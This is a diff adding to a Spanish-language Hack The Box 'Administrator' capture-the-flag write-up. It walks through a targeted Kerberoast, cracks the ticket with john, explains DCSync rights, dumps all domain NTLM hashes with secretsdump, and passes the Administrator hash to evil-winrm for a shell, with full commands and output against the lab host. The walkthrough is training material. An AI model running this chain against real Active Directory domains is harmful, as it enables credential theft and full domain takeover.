@@ -519,6 +519,8 @@ Mode                 LastWriteTime         Length Name
 
 Explorando a esta usuaria en bloodhount vemos que tiene permisos de genericwrite sobre el usuari **ethan**, así que nos descargamos la [herramienta](https://github.com/ShutdownRepo/targetedKerberoast) que nos proporciona bloodhount para el nn Targeted Kerberoast attack (ataque Kerberoasting dirigido), que es una versión más refinada del ataque clásico Kerberoasting, que se enfoca en obtener hashes de tickets de servicio (TGS) en Active Directory, pero solo de cuentas específicas, como cuentas de alto valor (por ejemplo, cuentas con privilegios elevados como Domain Admins, SQLService, etc.).
 
+![](../assets/images/htb-administrator/imagen6.png)
+
 El ataque Kerberoasting aprovecha el hecho de que en Active Directory:
  - Cualquier usuario autenticado puede solicitar un Ticket Granting Service (TGS) para cualquier cuenta que tenga un Service Principal Name (SPN).
  - El ticket TGS está cifrado con la contraseña del servicio asociado (el usuario que corre ese servicio).
@@ -529,5 +531,169 @@ El ataque Kerberoasting aprovecha el hecho de que en Active Directory:
 ntpdate -q 10.10.11.42
 2025-04-22 11:49:34.229874 (-0400) +25201.105948 +/- 0.055748 10.10.11.42 s1 no‑leap
 ```
+
+Ahora ya podemos lanzar el ataque: 
+
+```bash 
+python3 targetedKerberoast.py --dc-ip 10.10.11.42 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -U hash_ethan
+```
+
+E intentamos crackearla: 
+```bash 
+john hash -w:/usr/share/wordlists/rockyou.txt
+``` 
+
+Con una buena pc lo crackea rápido. 
+
+**Tenemos la contraseña: limpbizkit**
+
+Revisando las características de ethan: 
+
+![](../assets/images/htb-administrator/imagen9.png)
+
+| Permiso        | Descripción |
+|----------------|-------------|
+| `GetChanges`   | Permite replicar **atributos estándar** del Active Directory. Con este permiso, se pueden obtener muchos metadatos de las cuentas, pero **no los hashes de contraseña**. |
+| `GetChangesAll`| Permite replicar **todos los atributos**, incluyendo **contraseñas (NTLM hashes)**. Es el mínimo necesario para hacer un ataque **DCSync** exitoso. |
+
+### ¿Dónde se aplican?
+
+Estos permisos se asignan generalmente al nivel del **objeto del dominio (Domain NC)** en Active Directory. Se pueden ver (y modificar) mediante herramientas como:
+
+- **Active Directory Users and Computers (ADUC)** → Propiedades del dominio → pestaña *Security*.
+- **`dsacls`** desde PowerShell o CMD.
+- Herramientas de enumeración como `BloodHound`, `PowerView`, `ADExplorer`.
+
+### Uso en ataques: **DCSync**
+
+Una cuenta con permisos `GetChangesAll` (y también `Replicating Directory Changes In Filtered Set`) puede ejecutar un ataque de tipo **DCSync**, como hacen herramientas como `secretsdump.py` o `mimikatz`.
+
+Este ataque simula un **DC (Domain Controller)** y solicita la replicación de datos sensibles como el hash del `krbtgt`, `Administrator`, etc.
+
+
+Para detectar estas cuentas con permisos también podemos usar powershell:
+
+- `PowerView` en PowerShell:
+```powershell
+Get-DomainObjectAcl -Identity "DC=tu_dominio,DC=com" -ResolveGUIDs | 
+    ? { ($_.ActiveDirectoryRights -match "GenericAll") -or 
+        ($_.ObjectType -match "GetChanges(All)?") }
+```
+
+
+| Permiso        | Uso principal                | Riesgo |
+|----------------|------------------------------|--------|
+| `GetChanges`   | Replicar info estándar       | Medio  |
+| `GetChangesAll`| Replicar contraseñas (NTDS)  | **Crítico** |
+
+Una cuenta con ambos permisos tiene el poder de **drenar los hashes del dominio**. **Nunca debería concederse sin razón justificada y auditoría estricta.**
+
+Para que el ataque funcione, el usuario que se use (en este caso ethan) debe tener los siguientes permisos en el objeto del dominio:
+
+- Replicating Directory Changes (GetChanges)
+- Replicating Directory Changes All (GetChangesAll)
+
+  > Esto usualmente solo lo tienen:
+    > - Controladores de dominio (obvio).
+    > - Administradores del dominio.
+    > - Cuentas del grupo Enterprise Admins o Domain Admins.
+    > - Cuentas mal configuradas (delegación excesiva o insegura).
+
+
+Asì que usamos `secretsdump.py` para lanzar un ***DCSync atta***k, que se utiliza para extraer credenciales desde un sistema Windows. Puede obtener:
+
+- Hashes NTLM de usuarios (desde SAM)
+- Hashes de cuentas de servicio (desde el registro)
+- Credenciales en texto claro si están disponibles (por ejemplo, a través de LSASS)
+- Secretos del LSA (Local Security Authority)
+- Dependiendo del tipo de acceso, puede hacerlo de forma remota o local.
+
+En este caso vamos a obtener todos los hashes del dominio de los usuarios existentes: 
+
+```bash 
+─$ /home/kali/entorno/bin/secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
+administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
+administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:8864a202387fccd97844b924072e1467:::
+administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:95687598bfb05cd32eaa2831e0ae6850:::
+administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
+administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
+administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
+administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
+``` 
+Entonces tenemos el NT hash del Administrador
+
+```text
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+```
+
+```
+usuario:RID:LM hash:NT hash:::
+```
+
+Cada campo representa:
+
+| Campo                      | Descripción |
+|---------------------------|-------------|
+| `Administrator`           | Nombre del usuario |
+| `500`                     | RID (**Relative Identifier**) del usuario (500 = Administrator) |
+| `aad3b435b51404eeaad3b435b51404ee` | **LM hash** (antiguo algoritmo, generalmente desactivado y lleno de este valor "vacío") |
+| `3dc553ce4b9fd20bd016e098d2d2fd2e` | **NT hash** (hash NTLM de la contraseña del usuario) |
+| `:::`                     | Reservado para otros campos, como comentarios o SID |
+
+---
+
+- El **NT hash** (o **NTLM hash**) es un hash **MD4** de la contraseña del usuario codificada en **Unicode (UTF-16LE)**.
+- Es lo que utiliza Windows internamente para autenticar a los usuarios, especialmente en autenticaciones NTLM (por ejemplo, SMB, RDP si no se usa Kerberos).
+
+>  A diferencia del hash LM (LAN Manager), el NT hash **no corta contraseñas largas** ni convierte todo a mayúsculas. Por eso es más seguro (aunque sigue siendo crackeable offline).
+
+
+
+Ciertos protocolos de autenticación en Windows **no necesitan la contraseña en texto claro**, sino que **pueden usar directamente el NT hash** para autenticarte. Es decir:
+Con el  NT hash correcto podemos insertarlo en una sesión SMB, RDP o WinRM con una herramienta que lo soporte, **el sistema lo aceptará como si fuera la contraseña**.
+
+> El campo de LM hash sigue siendo obligatorio en la sintaxis, pero si no se usa, se pone el hash vacío típico (`aad3...`).
+
+
+- El formato completo `usuario:RID:LM:NT:` sigue un estándar común en dumps del archivo SAM o del `NTDS.dit`.
+
+**Ya podemos hacer passthehash**
+
+```bash 
+
+─$ evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+administrator\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ..\Desktop\
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         4/22/2025  10:02 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+
+``` 
 
 
